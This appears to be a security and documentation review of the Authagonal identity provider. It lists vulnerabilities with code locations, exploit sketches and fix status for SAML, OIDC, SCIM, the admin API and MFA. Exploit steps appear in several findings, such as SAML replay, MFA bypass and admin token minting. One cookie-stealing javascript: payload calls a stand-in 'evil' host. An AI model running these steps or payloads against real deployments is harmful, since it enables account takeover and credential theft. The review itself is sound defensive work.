# Authagonal — Security & Documentation Review

**Date:** 2026-05-30
**Reviewer:** static review (no build/run), against current source at branch `master` (latest tag 0.3.0)
**Method:** direct reading of source + a small number of focused subagents per area; every subagent claim was re-read and verified at the cited `file:line` before inclusion.

**Trust-model note:** this repo is effectively **single-tenant** (`DefaultTenantContext`, `TenantId="default"`); multi-tenant Host resolution lives in the separate `authagonal-cloud` repo. Several findings are *amplified to cross-tenant* in that host — flagged **[Cloud-amplified]**.

---

## Top criticals (fix first)

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | MFA fully bypassable — policy derived from attacker-controlled `returnUrl`; authorize never re-checks MFA | **Critical** | §9.1 |
| 2 | Federation account-takeover — SAML *and* OIDC link/sign-in by email, no `email_verified`, no `AllowedDomains` enforcement | **Critical** | §1.2 / §7.1 |
| 3 | SAML assertion replay — stripping unsigned `InResponseTo` routes to the IdP-initiated path that never populated the assertion-ID cache | **High** | §1.1 |
| 4 | SCIM Groups have zero cross-client isolation (read/modify/delete/enumerate any client's groups) | **High** (Critical [Cloud-amplified]) | §6.1 |
| 5 | Admin authz keys off a `scope` claim, and two admin endpoints mint that scope with no reserved-scope guard → privilege persistence + arbitrary-user impersonation | **High** | §5.1 / §5.2 |
| 6 | `X-Forwarded-For` trusted from `0.0.0.0/0` → IP rate-limit bypass + log poisoning | **High** | §4.1 |
| 7 | Unauthenticated `/_internal/backchannel-logout` (and `/_internal/cluster/gossip`) revoke any subject's sessions / poison rate-limits — only ingress gates them | **High** | §15.4 / §8 |
| 8 | Backups write signing-key **private** material (and, under the plaintext provider, TOTP/OIDC secrets) as plaintext; restore verifies no integrity → token forgery | **High** | §15.5 |

---

## Remediation status — branch `security-fixes-top8`

All eight top findings are fixed on branch `security-fixes-top8` (build clean, 367/367 tests pass). Summary of the changes and behaviour/config notes:

1. **MFA bypass (§9.1)** — `user.MfaEnabled` users are now ALWAYS challenged at login regardless of the `returnUrl`/client (`AuthEndpoints`); the cookie carries an `mfa_authenticated` marker (`CookieSignInHelper`), set on MFA-verify and on federated sign-ins (the upstream IdP owns auth); `/connect/authorize` re-checks it and forces re-auth if missing. *Behaviour change:* an enrolled user is challenged for every client, even MFA-`Disabled` ones.
2. **Federation takeover (§1.2/§7.1)** — both OIDC and SAML now resolve returning users by `(provider, sub)` first; email-match to a pre-existing account requires `email_verified=true` (OIDC) or a configured matching `AllowedDomains` entry (SAML); `AllowedDomains` is enforced on every federated login. *Behaviour change:* SAML connections that relied on email-linking without `AllowedDomains` must now set it.
3. **SAML replay (§1.1)** — assertion-ID single-use is enforced for every assertion (no longer flow-dependent).
4. **SCIM group IDOR (§6.1)** — groups are owned by the creating SCIM client (`OrganizationId`); every group read/write/list/delete is ownership-scoped. *Note:* legacy groups with no owner become inaccessible (404) until backfilled.
5. **Admin scope persistence (§5.1/§5.2)** — `POST /api/v1/token` constrains scopes to the client's `AllowedScopes` and forbids the admin scope; client create/update reserve the admin scope and never accept/echo secret hashes.
6. **X-Forwarded-For (§4.1)** — forwarded-header trust is config-driven (`ForwardedHeaders:ForwardLimit` default 1, `KnownNetworks`/`KnownProxies`); no longer trusts `0.0.0.0/0`. *Config:* set `ForwardedHeaders:KnownNetworks` to the ingress CIDR for the strongest guarantee.
7. **Internal endpoints (§15.4/§8)** — `/_internal/cluster/gossip` and `/_internal/backchannel-logout` now require a shared secret (`Cluster:Secret`, header `X-Cluster-Secret`) or, when unset, an internal (loopback/private) source IP; the gossip sender attaches the secret.
8. **Backup/restore (§15.5)** — the `SigningKeys` table is excluded from backups by default (`Backup:IncludeSigningKeys` to opt in); backup files are SHA-256 hashed into the manifest and verified before restore (`RestoreOptions.VerifyIntegrity`, default on); filesystem path segments are validated against traversal.

Not addressed (outside the top 8 — candidates for a follow-up pass): §6.2 SCIM email-change clobber, §12.1 revoked-access-token enforcement, §12.2 introspection cross-client, §12.3 userinfo scope-gating, §13.1 DCR grant_types, §15.1 TOTP replay window, §15.2 MFA-DELETE step-up, §15.3 WebAuthn assertion error handling, and the documentation items in §11/§14.

## Remediation status — branch `security-fixes-remaining` (all remaining findings)

A follow-up branch off `security-fixes-top8` addressed the rest. Build clean, 367/367 tests pass.

- **§2.1** auth-code single-use is now atomic (`IGrantStore.TryConsumeAsync` — conditional ETag delete; concurrent redemptions can't both win).
- **§3.1** JWT validation pins `ValidAlgorithms = ["ES256"]` (JwtBearer + introspection/revocation/userinfo/end-session).
- **§4.2** CORS origin cache is now keyed per tenant; **§4.3** cookie `Secure` is config-forceable (`Authentication:AlwaysSecureCookie`); **§4.4** the temporary SCIM request-logging middleware was removed.
- **§5.3** SSRF guard (`OutboundUrlValidator`) on OIDC discovery + discovery-derived JWKS/token/userinfo URLs, SAML metadata, and provisioning callbacks (blocks loopback/link-local/RFC1918/ULA + `localhost`/`.local`/`.internal`). **§5.4** OIDC client secret is never returned by the admin API. **§5.5/§13.3** `TccProvisioningOrchestrator` no longer uses `[ThreadStatic]` — configs are threaded through the call chain. **§5.6** SSO domains are format-validated and can't be hijacked from another connection.
- **§6.2** SCIM PUT/PATCH email changes re-check the global index and reject cross-account collisions.
- **§10.1/§10.2** login-app: `backUrl` gated by `isSafeReturnUrl`; tenant `customCssUrl` restricted to same-origin and `primaryColor` validated.
- **§11** docs: config defaults corrected (`Pbkdf2Iterations`=100000, `RefreshTokenReuseGraceSeconds`=0), new/undocumented keys documented, plaintext-secret/admin-API/forwarded-proxy/TLS security warnings added, admin-API doc completed (Clients/Scopes/Provisioning + `POST /api/v1/token` fixes), CHANGELOG brought to 0.3.0 + Unreleased, and the 5 untranslated docs stubbed into all 6 locales.
- **§12.1** revoked access tokens are rejected at the JwtBearer pipeline and userinfo (not just introspection). **§12.2** introspection rejects disabled clients and owner-scopes opaque refresh tokens (JWT introspection remains open to any enabled client — the holder can already decode the JWT). **§12.3** userinfo scope-gates email/profile/phone claims.
- **§13.1** DCR restricts `grant_types` to `authorization_code`/`refresh_token`, reserves the admin scope, and is rate-limited; **§13.2** the dead redirect-scheme check now rejects `javascript:`/`data:`/`file:`.
- **§15.1** TOTP records the last-accepted time-step and rejects replay within the window; **§15.2** credential deletion requires a real session (setup tokens can't downgrade MFA); **§15.3** WebAuthn assertion failures / clone regressions return 401 instead of 500; **§15.6** discovery advertises `ES256`; **§15.7** consent POST requires authorization and stores only `AllowedScopes`-bounded scopes.

Still open (LOW, noted): §13.4 device-flow `interval` field (RFC nicety; needs a response-model + AOT-context change), and §15.3's WebAuthn registration credential-ID uniqueness callback (narrow collision risk). Regression tests for the new behaviours (TOTP replay, SCIM collision, atomic code consume, federation strictness) are not yet added.

---

## 1. SAML

XSW is genuinely mitigated — `ValidateElementSignature` requires the `<ds:Signature>` be a *direct child* of the element claims are read from, checks `Reference.Uri == "#" + element.ID`, and `CheckSignature(cert, verifySignatureOnly:true)` is pinned to certs from IdP metadata (`SamlResponseParser.cs:253-335`). Metadata parsing uses `XDocument.Parse` (DTD-prohibited by default → no XXE). `RelayState` open-redirect is blocked (`SanitizeReturnUrl`).

### 1.1 — Assertion replay via unsigned `InResponseTo` stripping — **HIGH** — ✅ FIXED (`security-fixes-top8`)
`SamlEndpoints.cs:106-169`, `SamlResponseParser.cs:106-115`

The ACS decides SP-initiated (consume request-ID, single-use) vs. IdP-initiated (check assertion-ID cache) **solely from whether the response carries an `InResponseTo` attribute** (`SamlEndpoints.cs:126`). That attribute lives on the `<Response>` element, which is **not covered when only the `<Assertion>` is signed** — the common case (Azure AD signs the assertion; the parser accepts `responseSignatureValid || assertionSignatureValid`).

- **Exploit:** capture a victim's valid SP-initiated `SAMLResponse` (assertion-signed). A verbatim replay is rejected (request-ID consumed). But strip the unsigned `InResponseTo` from `<Response>` → `expectedInResponseTo == null` → code skips the request-ID check and takes the IdP-initiated branch → `CheckAndStoreAssertionIdAsync` finds the assertion-ID *new* (never stored during the original SP-initiated login) → **replay accepted**; attacker authenticates as the victim within the assertion validity window (+5 min default skew). Signed `Recipient` still matches the ACS URL, so nothing else blocks it.
- **Fix:** always `CheckAndStoreAssertionIdAsync` for every accepted assertion regardless of flow; treat the **signed** `SubjectConfirmationData/@InResponseTo` as authoritative, not the `<Response>` attribute; and/or require the Response to be signed.

### 1.2 — Federation account-takeover by email JIT-linking — **CRITICAL** (shared with OIDC §7.1) — ✅ FIXED (`security-fixes-top8`)
`SamlEndpoints.cs:175-267`

ACS resolves the user purely by `FindByEmailAsync(assertion email)` and signs in / links to whatever existing account matches; `EmailConfirmed=true` is set blindly, there's no `email_verified` equivalent, and `AllowedDomains` is never consulted. Any configured SAML IdP can assert `email=victim@othercorp.com` and take over that local-password user (or a user owned by a different connection). See §7.1 for full exploit/fix — same defect in both federation paths.

### 1.3 — `Conditions`/`SubjectConfirmation`/`Destination` checks skipped when absent — **LOW**
`SamlResponseParser.cs:91, 118-119, 159-161`. If `<Conditions>` is absent, all of NotBefore/NotOnOrAfter/Audience are skipped; if `Destination` is absent it's skipped. An IdP-signed assertion can't strip these without breaking the signature, so impact is low, but guarantees are only as strong as the IdP always including them. Consider failing closed if `Conditions`/`Audience` are missing.

### 1.4 — SAML response XML allows internal DTD entity expansion — **LOW**
`SamlResponseParser.cs:45` sets `XmlResolver = null` (blocks external entities/SSRF ✓) but not `DtdProcessing = Prohibit`. Internal entity expansion ("billion laughs") → DoS. Set `DtdProcessing = DtdProcessing.Prohibit`.

---

## 2. Token / PKCE / grants

Grant keys are SHA-256 hashed at rest (`TableGrantStore.HashKey`). Refresh rotation with reuse-detection + family revocation is correct (`ProtocolTokenService.cs:337-453`); grace defaults to 0 (strict). RFC 8707 resource subsetting enforced at issue and refresh. PKCE uses `FixedTimeEquals`, rejects unknown methods. Authorize endpoint does exact-match `redirect_uri` validation, enforces `response_type=code`, validates scopes ⊆ `AllowedScopes`, requires `S256` when `RequirePkce` (`AuthorizeEndpoint.cs:79-112`).

### 2.1 — Authorization-code single-use is a non-atomic TOCTOU — **MEDIUM**
`ProtocolTokenService.cs:275-279`, `TableGrantStore.GetAsync`/`RemoveAsync:77-90,127-141`

`HandleAuthorizationCodeAsync` does `GetAsync(code)` then `RemoveAsync(code)` — no ETag/conditional delete; `RemoveAsync` re-reads then deletes, swallowing 404. Two concurrent requests with the same code both pass the `Get` and both issue tokens → code redeemable more than once. No reuse-triggered revocation for auth codes (unlike refresh tokens). PKCE/client-auth limits exploitability, but per OAuth BCP codes must be atomically single-use.
- **Fix:** capture the entity ETag on read and conditional-delete; only proceed if this request won the delete. (Device-code path `ConsumeAsync` has the same Get-then-update race — `TokenEndpoint.cs:158-189`.)

---

## 3. Crypto / keys / JWKS

ES256-only enforcement at generation/rotation; JWKS emits only public `X`/`Y`/`Kid` — no private `D` (`BuildJwksAsync:102-111`); expired/unsupported keys filtered. Vault Transit signs raw R‖S and verifies with `IeeeP1363FixedFieldConcatenation` — correct JOSE encoding. Keys never logged.

### 3.1 — JWT validation pins no `ValidAlgorithms`; audience effectively unvalidated — **LOW / MEDIUM**
`AuthagonalExtensions.cs:325-334`. No `ValidAlgorithms`, and `AudienceValidator = (audiences, _, _) => audiences?.Any() == true` — any non-empty `aud` passes. Alg-confusion mitigated in practice (resolver returns `ECDsaSecurityKey`), but the admin policy checks only issuer + signing key + `scope`, not audience → a token minted for any resource carrying the admin scope is accepted at the admin API (widens §5 blast radius). Fix: `ValidAlgorithms = ["ES256"]`; give the admin policy a concrete expected audience.

---

## 4. Startup / wiring

### 4.1 — `X-Forwarded-For` trusted from all proxies → rate-limit bypass + log poisoning — **HIGH** — ✅ FIXED (`security-fixes-top8`)
`AuthagonalExtensions.cs:411-417`. `KnownIPNetworks = { new IPNetwork(IPAddress.Any, 0) }` with default `ForwardLimit=1` → client fully controls `RemoteIpAddress` via one `X-Forwarded-For` value. The registration limiter keys on `register|{RemoteIpAddress}` (`AuthEndpoints.cs:271-273`) → rotating XFF defeats it; all IP-keyed limits and audit-log IPs are attacker-controlled. Fix: set `KnownProxies`/`KnownNetworks` to the actual ingress CIDR (or use the platform's verified client-IP header).

### 4.2 — CORS provider cache is a process-global singleton, not tenant-keyed — **MEDIUM [Cloud-amplified]**
`DynamicCorsPolicyProvider.cs:14,43-83` + `AuthagonalExtensions.cs:374`. CORS is safe from arbitrary reflection (request origin must be in the allow-list before `AllowCredentials`), but the singleton caches one `_cachedOrigins` populated from the first request's client store while claiming to "support multi-tenant" → in Cloud, tenant A's origins served to tenant B for the cache lifetime. Key the cache by tenant.

### 4.3 — Cookie `SecurePolicy = SameAsRequest` — **LOW**
`AuthagonalExtensions.cs:277`. `Secure` only set when request is HTTPS; behind a plaintext hop the auth cookie can be sent without `Secure`. Use `CookieSecurePolicy.Always` in production.

### 4.4 — Leftover diagnostic middleware logs every SCIM request at Warning — **LOW (cleanup)**
`AuthagonalExtensions.cs:421-448` ("temporary diagnostic"). Logs method/path/query/host/UA (not the token). Remove before GA; query strings can carry PII.

---

## 5. Admin API authorization

Every admin route is behind `RequireAuthorization("IdentityAdmin")` — no anonymous/weak routes. Systemic issue: **admin = "token whose `scope` claim contains `authagonal-admin`"**, the default `IClientScopeGuard` is `AllowAllClientScopeGuard` (`AuthagonalExtensions.cs:224`), and multiple admin endpoints can put that scope into a fresh token with no reserved-scope check → any admin credential becomes self-perpetuating (survives rotation/revocation) and yields arbitrary-user impersonation.

### 5.1 — `POST /api/v1/token` mints any scope for any user, incl. a refresh token — **HIGH** — ✅ FIXED (`security-fixes-top8`)
`Admin/TokenEndpoints.cs:47-54` *(verified)*. `scopes = scopesParam.Split(' ')` with no `client.AllowedScopes` check; flows into `CreateAccessTokenAsync` (copies scopes verbatim into `scope`) and `CreateRefreshTokenAsync`. `POST /api/v1/token?clientId=<any>&userId=<any>&scopes=authagonal-admin` → admin-scoped access + refresh token → long-lived admin persistence + impersonation of any user for any client. No audit-log call. Fix: constrain `scopes` to `client.AllowedScopes`, forbid the admin scope, audit-log.

### 5.2 — Client create/update: admin-token factory + mass-assignment + secret-hash disclosure — **HIGH** — ✅ FIXED (`security-fixes-top8`)
`Admin/ClientEndpoints.cs:39-60, 62-84, 28, 36` *(verified)*. `CreateClient` binds a raw `OAuthClient` (mass-assignable `ClientSecretHashes`, `RequirePkce`, `RequireClientSecret`, `RedirectUris`, `AllowedCorsOrigins`, lifetimes), gated only by the allow-all scope guard. Create a `client_credentials` client with `AllowedScopes=["authagonal-admin"]` + a known secret hash → mint admin tokens at will. `ListClients`/`GetClient` + create/update echoes return the full client incl. `ClientSecretHashes` → offline cracking. Fix: create/update DTOs excluding secret hashes; validate redirect URIs/grant types; reserve the admin scope; project secret hashes out of all responses; make `AllowAllClientScopeGuard` deny the admin scope.

### 5.3 — SSRF via provisioning "TestApp" + connection metadata URLs — **MEDIUM**
`Admin/ProvisioningEndpoints.cs:126-183`, `Admin/SsoEndpoints.cs` (`MetadataLocation`), `Oidc/OidcDiscoveryClient.cs:29,39,50`. `TestApp` server-side POSTs to admin-supplied `{CallbackUrl}/try` and returns ≤1 KB of the body (SSRF oracle to `169.254.169.254`/`localhost`/RFC1918, forwarding the configured API key). OIDC/SAML `MetadataLocation` and discovery-derived `jwks_uri`/`token_endpoint`/`userinfo_endpoint` fetched with no scheme/host validation, redirects followed. Admin-gated but chainable (incl. to the unauthenticated cluster endpoint §8). Block loopback/link-local/private ranges, require https, allow-list hosts, disable auto-redirect.

### 5.4 — Upstream OIDC `ClientSecret` echoed in plaintext by admin GET — **MEDIUM**
`Admin/SsoEndpoints.cs:212,224`. `GetOidcConnection` returns the full config incl. `ClientSecret`; with the default `PlaintextSecretProvider` that's the raw upstream secret. Project it out / return `HasClientSecret`.

### 5.5 — `TccProvisioningOrchestrator` uses `[ThreadStatic]` state across `await` — **HIGH (correctness + data-bleed)** *(pending direct verification — §12)*
`TccProvisioningOrchestrator.cs:40,47,276`. A `[ThreadStatic] static` `_resolvedApps` set before an `await` and read after can be null/stale on a different pooled thread → wrong app's `CallbackUrl`/`ApiKey`, or sync-over-async fallback. Violates the "no in-memory runtime state" rule. Pass the resolved dictionary as a parameter / `AsyncLocal`.

### 5.6 — SSO-domain hijack & `OrganizationId` mass-assignment — **LOW/MEDIUM**
Admin can map any domain (e.g. `gmail.com`) to a connection (last-writer-wins, no "already claimed" check), and `UpdateUser` sets arbitrary `OrganizationId` (flows to `org_id` in tokens) with no existence check. Admin-gated; validate.

---

## 6. SCIM

SCIM tokens are 256-bit random, SHA-256-hashed at rest, checked for revoked/expiry. **User** resources are correctly client-scoped — every `GET/PUT/PATCH/DELETE` re-checks `ScimProvisionedByClientId == client_id` → 404; `List` uses `ListByScimClientAsync`. PATCH uses a strict field whitelist (email/names/active/externalId) — no path writes `PasswordHash`/`SecurityStamp`/`Roles`/`OrganizationId`/`ScimProvisionedByClientId`. `ScimFilterParser` is applied in-memory (no OData injection).

### 6.1 — SCIM Groups: no cross-client isolation at all — **HIGH (Critical [Cloud-amplified])** — ✅ FIXED (`security-fixes-top8`)
`Scim/ScimGroupEndpoints.cs:30-193` *(verified)*. No group handler reads `client_id`; `CreateGroupAsync` never sets an owner; `ListGroupsAsync` calls `groupStore.ListAsync(null,…)` → all groups in the environment; `Get/Replace/Patch/Delete` operate on any id with no ownership check. Any SCIM token can enumerate, read, rewrite membership of, or delete any other client's groups (cross-tenant in Cloud). Fix: stamp an owner on create from the caller's `client_id`; enforce ownership on every read/write; pass `clientId` (not `null`) to `ListAsync`; validate members reference users owned by the caller; add a rate limit (Group endpoints have none).

### 6.2 — Email-change on PUT/PATCH clobbers the global email index — **HIGH** — ✅ FIXED (`security-fixes-remaining`)
`Scim/ScimUserEndpoints.cs:225-230`, `ScimPatchApplier.cs:61-67`, `TableUserStore.UpdateAsync:111-128`. The create collision check rejects duplicates, but email change on update does **not** re-check — `UpdateAsync` blindly re-points the email→userId index. A SCIM client can PATCH a user it owns to a victim's email → repoints global lookup at the attacker-owned record → account takeover at next `FindByEmailAsync`. Re-run the collision check on email change; constrain to authorized domains.

---

## 7. External OIDC federation & account linking

id_token validation is correct — signature vs. discovery JWKS, `iss`, `aud == ClientId`, lifetime, and a required `nonce` compared ordinally (`OidcEndpoints.cs:190-220`). `state` is 256-bit, durable, consumed-on-use (replay-safe), lifetime-bounded, bound to nonce + PKCE S256 (`OidcStateStore.cs`) → login-CSRF mitigated. No tokens logged.

### 7.1 — Account takeover: `email_verified` never checked before email linking/sign-in — **CRITICAL** — ✅ FIXED (`security-fixes-top8`)
`OidcEndpoints.cs:224, 270, 336-352` (and `email_verified` discarded ~:594-600); identical in SAML (§1.2) *(verified)*. User resolved by email only (`FindByEmailAsync`); `email_verified` never read; new users `EmailConfirmed=true`; existing match signed-in + linked with no verification gate. Returning users matched by email, not by stable `(provider, sub)`. `AllowedDomains` never enforced. **Exploit:** any connection pointed at an IdP permitting unverified/arbitrary email (consumer/multi-tenant Entra, self-hosted Keycloak/Authentik, BYO-OIDC), or any second connection, lets an attacker assert `victim@yourcorp.com` and sign in as the existing account. Fix: resolve by `(provider, sub)` first; only email-match when `email_verified == true`; never auto-link onto a pre-existing local/different-connection account without explicit verified linking; enforce `AllowedDomains` in both OIDC and SAML callbacks.

### 7.2 — SSRF in discovery / JWKS / userinfo fetch — **MEDIUM** (see §5.3; userinfo URL from the discovery doc receives the access token).

### 7.3 — `SanitizeReturnUrl` doesn't reject `/\…` — **LOW**. Parse as a relative URI rather than `StartsWith('/')`.

---

## 8. Cluster gossip — unauthenticated, enables rate-limit DoS — **MEDIUM** — ✅ FIXED (`security-fixes-top8`)
`ClusterEndpoints.cs:10-44`, `DistributedRateLimiter.cs:73-122` *(verified)*. `POST /_internal/cluster/gossip` is `AllowAnonymous()` and the shared-secret check is a comment, not code. The CRDT merge is max-per-key, so an attacker can only *inflate* counters (cannot bypass brute-force limits) but **can force any rate-limit key (`register|{victim-ip}`, `scim|{clientId}`) over threshold → DoS/lockout**, plus membership spoofing and unbounded `_peerStates` growth from fake `NodeId`s (bounded only by `Prune`). Reachable on a flat cluster network or via §5.3/§7.2 SSRF to `localhost`. Actually authenticate it, or bind to an internal-only listener and verify peer identity.

---

## 9. Interactive auth (login / register / reset / MFA)

### 9.1 — MFA bypass via `returnUrl` client_id; authorize never re-checks MFA — **CRITICAL** — ✅ FIXED (`security-fixes-top8`)
`AuthEndpoints.cs:130-205` + `AuthorizeEndpoint.cs:114-139` *(verified)*. Login derives MFA policy from the `client_id` parsed out of the attacker-controllable `returnUrl` (`ExtractClientIdFromReturnUrl`), defaulting to `MfaPolicy.Disabled` when absent. If `Disabled`, the full session cookie is issued **without** an MFA challenge — even for an MFA-enrolled user. The authorize endpoint then trusts the cookie (`IsAuthenticated`) with **no independent MFA check**. **Exploit:** POST `/api/auth/login` with the password and no `returnUrl` (or one pointing at an MFA-disabled client) → session issued MFA-free → navigate to `/connect/authorize?client_id=<MFA-required client>` → code/tokens issued. MFA defeated for the whole account. Fix: if `user.MfaEnabled`, always challenge regardless of client/`returnUrl`; record an `amr`/`mfa` marker in the cookie and require it at authorize for MFA-required clients.

### 9.2 — Login: account enumeration (status codes + timing) and no IP throttle — **MEDIUM**
`AuthEndpoints.cs:74-113`. Distinct responses leak existence (`401 invalid_credentials` vs `403 account_disabled` / `423 locked_out` / `403 email_not_confirmed`, plus `409 email_already_registered` on register). Timing leaks too: unknown users return before any password hash; existing users run PBKDF2 (forgot-password added a delay, login did not). No rate limiter on `/api/auth/login` or `/api/auth/mfa/verify` (only per-account lockout) → password-spraying across accounts and account-lockout DoS (anyone who knows a victim's email can lock them out). Add an IP+account limiter (mind §4.1), uniform responses, dummy-hash the unknown-user path.

### 9.3 — `EmailConfirmed = email.EndsWith("@example.com")` at registration — **MEDIUM (footgun)**
`AuthEndpoints.cs:303`. Auto-confirms any `@example.com` registration, bypassing email verification. `example.com` is non-routable so impact is limited, but it's a suffix-based trust backdoor — config-gate or remove before GA.

### 9.4 — Positives
TOTP/recovery/WebAuthn verify atomically consumes the challenge before checking (one guess per password login); recovery codes single-use; WebAuthn sign-count enforced. Password reset uses a separate 256-bit single-use token, rotates the security stamp, revokes all grants (`AuthEndpoints.cs:473-541`). PBKDF2-SHA256 @ 100k iters, 128-bit salt, `FixedTimeEquals`, bcrypt/Identity-V3 migrate-on-login (`PasswordHasher.cs`). (100k PBKDF2-SHA256 is below OWASP's current 600k guidance — consider raising `Auth:Pbkdf2Iterations`.)

---

## 10. Frontend (login-app)

No token storage (cookie-only, `credentials:'include'`); no `dangerouslySetInnerHTML`/`innerHTML`; `isSafeReturnUrl` (origin + leading-`/`) guards all `returnUrl` navigations incl. the `/connect/authorize` redirect; error text rendered as escaped JSX.

- **10.1 — Open redirect / one-click `javascript:` on MFA setup — MEDIUM.** `MfaSetupPage.tsx:45,357-362` renders `backUrl` from the query string into an `<a href>` with no `isSafeReturnUrl` check. `?backUrl=javascript:fetch('//evil/'+document.cookie)` executes in the IdP origin on click. Gate with `isSafeReturnUrl`.
- **10.2 — Tenant `customCssUrl` injected as cross-origin `<link rel=stylesheet>` — MEDIUM.** `AuthLayout.tsx:65-72`. Attacker-controlled CSS on the login page enables UI-redress/CSS-exfil. Restrict to same-origin/allow-list; validate `primaryColor` as a color literal. `logoUrl`/`clientUri` lower risk (img src / server-sourced) but scheme-validating is good hygiene.

---

## 11. Documentation

- **11.A Version drift:** `CHANGELOG.md` top entry is `[0.1.86]` while the released tag is 0.3.0 — the entire 0.2.x→0.3.0 series is unlogged. npm package name conflicts (README `@drawboard/authagonal-login` vs installation.md/release.yml `@authagonal/login`); docs-site URL conflicts (`drawboardltd.github.io` vs `github.com/authagonal`).
- **11.B Config accuracy:** `configuration.md` states `Pbkdf2Iterations` default 50000 (code = 100000) and `RefreshTokenReuseGraceSeconds` default 60 (code = 0; narrative wrongly assumes a 60s grace). Undocumented real keys: `Storage:TableServiceUri` (production-preferred MI path), `Storage:NameIndexesEnabled`, `LoginAppUrl` (documented nowhere), `Auth:DynamicClientRegistrationEnabled`, `SeedClient`. No phantom keys.
- **11.C Security-doc gaps that lead to insecure deploys:**
  1. **No warning that the default `PlaintextSecretProvider` stores upstream OIDC client secrets and TOTP seeds in cleartext** — `SecretProvider:VaultUri` described as merely "optional." Most dangerous doc gap.
  2. `AdminApi:Enabled=true` default documented but no guidance to network-restrict the admin API / control the admin scope (esp. given §5).
  3. Forwarded-headers / trusted-proxy not documented — docs lean on the per-IP limiter while the app trusts XFF from `0.0.0.0/0` (§4.1).
  4. No "run behind TLS" guidance; cookie `Secure` is `SameAsRequest`, examples use `http://localhost`.
- **11.D Admin-API doc:** Clients, Scopes, and Provisioning-Apps endpoint groups are entirely undocumented. The impersonation `POST /api/v1/token` doc shows comma-separated `scopes` (code splits on space) and documents a `refreshTokenLifetime` parameter that doesn't exist.
- **11.E Translation parity:** 18 of 23 English docs translated into all 6 languages; **5 have zero translations**: `client-registration.md`, `front-channel-logout.md`, `par.md`, `scopes.md`, `whitepaper-table-storage-backup.md`.

---

## 12. Token lifecycle endpoints (introspection / revocation / userinfo / logout)

**Positives:** Revocation enforces token ownership — `TryRevokeAccessTokenAsync` only revokes if `token.client_id == caller` (`RevocationEndpoint.cs:97-98`) and refresh revoke checks `grant.ClientId == clientId` (`ProtocolTokenService.cs:592`); a client cannot revoke another client's tokens. EndSession validates `post_logout_redirect_uri` by exact match against the id_token_hint client's `PostLogoutRedirectUris` and only redirects on a match — no open redirect (`EndSessionEndpoint.cs:114-128`); front-channel iframes and the JS redirect target are `HtmlEncode`d and the only attacker-influenced part (`state`) is `Uri.EscapeDataString`d.

### 12.1 — Revoked access tokens are not enforced outside `/connect/introspect` — **MEDIUM**
`IntrospectionEndpoint.cs:86-88` checks `IRevokedTokenStore.IsRevokedAsync(jti)`, but the **JwtBearer pipeline (admin APIs) and `UserinfoEndpoint` never consult the revoked-token store** (`AuthagonalExtensions.cs:325-334`, `UserinfoEndpoint.cs:34-50`). Access-token revocation (`/connect/revocation`) writes the `jti` to the store, but every protected resource hosted by the server keeps accepting the revoked JWT until natural expiry. Revocation thus gives a false sense of security for access tokens. **Fix:** add a `jti` revocation check in the JwtBearer `OnTokenValidated` event and in userinfo; rely on short access-token lifetimes as defence-in-depth.

### 12.2 — Introspection: any authenticated client can introspect any token — **MEDIUM (info disclosure)**
`IntrospectionEndpoint.cs:60-126`. After client auth, the endpoint validates/looks up the token with **no check that the token belongs to (or is audienced for) the calling client** — any registered client with a secret can introspect any access or refresh token issued by the server and learn `sub`/`client_id`/`scope`/`aud`. `client.Enabled` is also not checked (a disabled client can still introspect). **Fix:** restrict introspection to the token's audience/owner (or a dedicated introspection capability); reject disabled clients.

### 12.3 — Userinfo ignores token scope — returns all PII/roles/groups — **MEDIUM**
`UserinfoEndpoint.cs:60-90`. Any token with a valid `sub` (and any non-empty `aud`, per the same permissive `AudienceValidator` as §3.1) receives `email`, `email_verified`, `given_name`, `family_name`, `name`, `phone_number`, `org_id`, `roles`, and `groups` — **regardless of whether `email`/`profile` scopes were granted**. An `openid`-only access token over-discloses full profile + roles + group membership. **Fix:** gate each claim block on the token's `scope` (OIDC standard). (Note: `groups` is computed via `GetGroupsByUserIdAsync`, which the SCIM Group IDOR §6.1 lets another client poison.)

## 13. Device flow, PAR, dynamic client registration

**Positives:** device codes are 256-bit (`RandomNumberGenerator.GetBytes(32)` hex), user codes ~40-bit from an unambiguous alphabet, all stored hashed; device-authorization validates client/secret/grant-type/scope ⊆ AllowedScopes (`DeviceAuthorizationEndpoint.cs:36-65`); `/api/auth/device/approve` requires an authenticated cookie and consumes the user_code. PAR `request_uri` is 256-bit, client-bound, 90s-expiry, and only consumed after a code is issued (`ProtocolPushedAuthorizationService.cs`). DCR generates the client secret server-side (does *not* accept caller-supplied secret hashes — safer than the admin client endpoint).

### 13.1 — DCR (when enabled) accepts arbitrary `grant_types` + any existing scope; no admin-scope reservation — **MEDIUM (gated off by default)**
`ClientRegistrationEndpoint.cs:37, 62-79, 99-110`. DCR is off by default (good). When `Auth:DynamicClientRegistrationEnabled=true`, the `/connect/register` endpoint is anonymous and a registrant can set **any `grant_types`** (no allow-list — incl. `client_credentials`) and request **any scope that exists in the scope store**. If an admin has created a store scope named `authagonal-admin` (see §5/scope endpoint), an anonymous registrant can self-register a `client_credentials` client with `AllowedScopes=["authagonal-admin"]` and then mint admin tokens — anonymous privilege escalation. Even without that, open DCR + `client_credentials` lets anyone obtain tokens for any store scope. **Fix:** restrict DCR `grant_types` to a safe allow-list (no `client_credentials`), reserve the admin scope, and rate-limit registration.

### 13.2 — DCR redirect-URI scheme check is a no-op — **LOW**
`ClientRegistrationEndpoint.cs:41-42`: `(parsed.Scheme != "http" && parsed.Scheme != "https" && !parsed.IsAbsoluteUri)` — since `Uri.TryCreate(…, Absolute)` guarantees `IsAbsoluteUri`, the third conjunct is always false, so the whole condition is always false and **no scheme is ever rejected** (e.g. `javascript:` registers). Limited impact (authorize requires exact match and 302-`Location` doesn't execute `javascript:`), but the intended validation doesn't run. Fix: validate scheme as the first clause, don't `&&` it with the always-false `IsAbsoluteUri`.

### 13.3 — §5.5 confirmed: `TccProvisioningOrchestrator._resolvedApps` is `[ThreadStatic]` — **HIGH (correctness; data-bleed [Cloud-amplified])** — ✅ FIXED (`security-fixes-remaining`)
